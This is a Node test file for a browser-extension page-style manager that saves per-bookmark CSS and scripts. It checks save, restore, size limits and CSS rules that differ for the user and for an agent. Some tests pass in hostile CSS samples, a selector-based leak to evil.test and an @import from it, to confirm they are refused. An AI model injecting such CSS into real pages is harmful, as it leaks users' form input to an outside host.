import assert from 'node:assert/strict';
import test from 'node:test';

import { PageStyleManager } from '../src/managers/impl/pageStyleManager.ts';
import { BOOKMARK_PAGE_STYLES_KEY } from '../src/managers/shared/pageStyleApi.ts';

const entry = (css, autoApply, origin, rev, script = '') => ({ css, autoApply, origin, rev, script });

const SCRIPT = 'agent.on(document, "keydown", (event) => { if (event.key === "]") seekNext(); });';

// A manager over a fake storage area; `local` is the area, `writes` counts storage.set calls
function createManager({ stored = {}, getError = null } = {})
{
  const local = { ...stored };
  const counters = { writes: 0 };
  let revs = 0;
  const manager = new PageStyleManager({
    storage: {
      get: async (key) =>
      {
        if (getError) throw getError;
        return key in local ? { [key]: local[key] } : {};
      },
      set: async (values) =>
      {
        counters.writes++;
        Object.assign(local, values);
      },
    },
    broadcast: async () => {},
    newRev: () => `rev-${++revs}`,
  });
  return { manager, local, counters };
}

test('removing a bookmark, and later the folder holding another, drops their styles and keeps the rest', async () =>
{
  // Bookmark 10 sits in folder 5, bookmark 11 in its subfolder 6; bookmark 12 is elsewhere
  const { manager, local, counters } = createManager({
    stored: {
      [BOOKMARK_PAGE_STYLES_KEY]: {
        10: entry('a {}', true, 'https://a.test', 'r1'),
        11: entry('b {}', false, 'https://b.test', 'r2'),
        12: entry('c {}', true, 'https://c.test', 'r3'),
      },
    },
  });
  await manager.load();

  await manager.handleBookmarksRemoved(['10']);

  assert.equal(manager.styles.styleFor('10'), null);
  assert.deepEqual(local[BOOKMARK_PAGE_STYLES_KEY], {
    11: entry('b {}', false, 'https://b.test', 'r2'),
    12: entry('c {}', true, 'https://c.test', 'r3'),
  });

  // bookmarks.onRemoved for folder 5: its id and every descendant's
  await manager.handleBookmarksRemoved(['5', '6', '11']);

  assert.deepEqual(local[BOOKMARK_PAGE_STYLES_KEY], { 12: entry('c {}', true, 'https://c.test', 'r3') });
  assert.deepEqual(manager.getState().styles, { 12: entry('c {}', true, 'https://c.test', 'r3') });

  const writesBefore = counters.writes;
  await manager.handleBookmarksRemoved(['40', '41']);

  assert.equal(counters.writes, writesBefore);
});

test('save refuses CSS that loads remote content and pages that are not http(s), and keeps the stored value', async () =>
{
  const stored = { 10: entry('video { width: 100% !important; }', true, 'https://videos.test', 'r1') };
  const { manager, local, counters } = createManager({ stored: { [BOOKMARK_PAGE_STYLES_KEY]: stored } });
  await manager.load();

  await assert.rejects(
    manager.save('10', '@import "https://evil.test/x.css";\nvideo { width: 90% !important; }', '', 'https://videos.test/u/1'),
    /@import is not allowed/
  );
  await assert.rejects(
    manager.save('10', 'input[value^="a"] { background: url(https://evil.test/leak?a) }', '', 'https://videos.test/u/1'),
    /url\(\) with a non-data: URL is not allowed/
  );
  await assert.rejects(
    manager.save('11', 'body { color: red; }', '', 'chrome://settings'),
    /only http and https pages/
  );

  assert.equal(counters.writes, 0);
  assert.deepEqual(local[BOOKMARK_PAGE_STYLES_KEY], stored);
  assert.deepEqual(manager.getState().styles, stored);
});

test('save keeps the user\'s CSS with remote loads and var() as is, and refuses the same CSS from the agent', async () =>
{
  const css = [
    '@import url("https://fonts.test/css?family=Inter");',
    ':root { --accent: #2a6; }',
    'body { font-family: Inter; background: url(https://images.test/bg.png); color: var(--accent); }',
  ].join('\n');
  const { manager, local } = createManager();
  await manager.load();

  await assert.rejects(manager.save('10', css, '', 'https://videos.test/u/1', false), /@import is not allowed/);
  assert.equal(local[BOOKMARK_PAGE_STYLES_KEY], undefined);

  await manager.save('10', css, '', 'https://videos.test/u/1', true);

  assert.deepEqual(local[BOOKMARK_PAGE_STYLES_KEY], {
    10: { ...entry(css, true, 'https://videos.test', 'rev-1'), cssByUser: true },
  });
});

test('save refuses CSS over 20 KB from the user as from the agent', async () =>
{
  const { manager, counters } = createManager();
  await manager.load();
  const css = `body { color: red; }\n/* ${'x'.repeat(20 * 1024)} */`;

  await assert.rejects(manager.save('10', css, '', 'https://videos.test/u/1', true), /larger than 20 KB/);
  await assert.rejects(manager.save('10', css, '', 'https://videos.test/u/1', false), /larger than 20 KB/);

  assert.equal(counters.writes, 0);
});

test('a save through dispatch is the user\'s CSS only when the message says so', async () =>
{
  const css = 'body { background: url(https://images.test/bg.png); }';
  const { manager, local } = createManager();
  await manager.load();

  await assert.rejects(
    manager.dispatch('save', { bookmarkId: '10', css, script: '', pageUrl: 'https://a.test/', cssByUser: 'true' }),
    /url\(\) with a non-data: URL is not allowed/
  );
  await manager.dispatch('save', { bookmarkId: '10', css, script: '', pageUrl: 'https://a.test/', cssByUser: true });

  assert.equal(local[BOOKMARK_PAGE_STYLES_KEY][10].cssByUser, true);
});

test('a script-only save is stored with empty CSS and Auto-apply on', async () =>
{
  const { manager, local } = createManager();
  await manager.load();

  await manager.save('10', '', SCRIPT, 'https://videos.test/watch?v=1');

  assert.deepEqual(local[BOOKMARK_PAGE_STYLES_KEY], { 10: entry('', true, 'https://videos.test', 'rev-1', SCRIPT) });
});

test('save refuses empty CSS and script together and a script over the size cap, and keeps the stored value', async () =>
{
  const stored = { 10: entry('video { width: 100% !important; }', true, 'https://videos.test', 'r1', SCRIPT) };
  const { manager, local, counters } = createManager({ stored: { [BOOKMARK_PAGE_STYLES_KEY]: stored } });
  await manager.load();

  await assert.rejects(manager.save('10', '  \n', '\n', 'https://videos.test/u/1'), /no CSS or script to save/);
  await assert.rejects(
    manager.save('10', 'a {}', 'x'.repeat(64 * 1024 + 1), 'https://videos.test/u/1'),
    /script is larger than 64 KB/
  );

  assert.equal(counters.writes, 0);
  assert.deepEqual(local[BOOKMARK_PAGE_STYLES_KEY], stored);
});

test('Undo of a delete puts each style back on the new bookmark id unchanged, Auto-apply, rev and script included', async () =>
{
  const bookmark = entry('video { width: 100% !important; }', false, 'https://videos.test', 'r1', SCRIPT);
  const favorite = entry('main { max-width: none !important; }', true, 'https://docs.test', 'r2');
  const { manager, local } = createManager({ stored: { [BOOKMARK_PAGE_STYLES_KEY]: { 10: bookmark, 20: favorite } } });
  await manager.load();

  await manager.handleBookmarksRemoved(['10', '20']);
  await manager.restore('110', bookmark);
  await manager.restore('120', favorite);

  // A save would have turned Auto-apply on for a new id and made a new rev
  assert.deepEqual(local[BOOKMARK_PAGE_STYLES_KEY], { 110: bookmark, 120: favorite });
  assert.equal(manager.styles.styleFor('120').appliedId, 'saved-r2');
});

test('restore refuses a malformed record, CSS that loads remote content and an oversized script, with no write', async () =>
{
  const { manager, local, counters } = createManager();
  await manager.load();

  await assert.rejects(manager.restore('110', entry('a {}', true, 'https://a.test', '')), /record is incomplete/);
  await assert.rejects(manager.restore('110', entry('a {}', true, 'chrome://settings', 'r1')), /record is incomplete/);
  await assert.rejects(
    manager.restore('110', entry('@import "https://evil.test/x.css";', true, 'https://a.test', 'r1')),
    /@import is not allowed/
  );
  await assert.rejects(
    manager.restore('110', entry('a {}', true, 'https://a.test', 'r1', 'x'.repeat(64 * 1024 + 1))),
    /script is larger than 64 KB/
  );

  assert.equal(counters.writes, 0);
  assert.equal(local[BOOKMARK_PAGE_STYLES_KEY], undefined);
});

test('restore keeps the user\'s CSS with a remote url() and refuses it in a record of the agent\'s CSS', async () =>
{
  const css = 'body { background: url(https://images.test/bg.png); }';
  const byUser = { ...entry(css, false, 'https://a.test', 'r1'), cssByUser: true };
  const { manager, local } = createManager();
  await manager.load();

  await assert.rejects(manager.restore('110', entry(css, false, 'https://a.test', 'r1')), /url\(\) with a non-data: URL/);
  assert.equal(local[BOOKMARK_PAGE_STYLES_KEY], undefined);

  await manager.restore('110', byUser);

  assert.deepEqual(local[BOOKMARK_PAGE_STYLES_KEY], { 110: byUser });
});

test('an unreadable stored value is not overwritten by a bookmark-removed event, and load still resolves', async (t) =>
{
  t.mock.method(console, 'error', () => {});
  const unreadable = [entry('a {}', true, 'https://a.test', 'r1')];
  const { manager, local, counters } = createManager({ stored: { [BOOKMARK_PAGE_STYLES_KEY]: unreadable } });

  await manager.load();
  await manager.handleBookmarksRemoved(['0', '10']);

  assert.equal(counters.writes, 0);
  assert.deepEqual(local[BOOKMARK_PAGE_STYLES_KEY], unreadable);

  // A storage error doesn't reject the load either: stateReady waits on it
  const failing = createManager({ getError: new Error('storage unavailable') });
  await failing.manager.load();

  assert.deepEqual(failing.manager.getState().styles, {});
});
